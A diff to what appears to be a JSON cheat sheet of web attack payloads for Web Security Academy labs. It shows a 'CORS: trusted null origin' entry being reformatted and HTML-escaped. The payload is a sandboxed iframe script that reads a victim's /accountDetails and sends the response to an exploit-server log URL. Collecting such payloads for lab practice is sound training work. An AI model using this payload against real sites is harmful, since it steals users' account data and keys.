@@ -58,10 +58,10 @@
         ]
     },
     {
-        "title": "CORS:trusted null origin",
+        "title": "CORS: TRUSTED NULL ORIGIN",
         "subtitle": "insecure  CORS configuration where the website trusts the \"null\" origin js code",
         "commands": [
-            "<iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"<script>",
+            "&lt;iframe sandbox=\"allow-scripts allow-top-navigation allow-forms\" srcdoc=\"&lt;script&gt;",
             "    var req = new XMLHttpRequest();",
             "    req.onload = reqListener;",
             "    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);",
@@ -70,7 +70,7 @@
             "    function reqListener() {",
             "        location='YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+encodeURIComponent(this.responseText);",
             "    };",
-            "</script>\"></iframe>"
+            "&lt;/script&gt;\"&gt;&lt;/iframe&gt;"
         ]
     },
     {
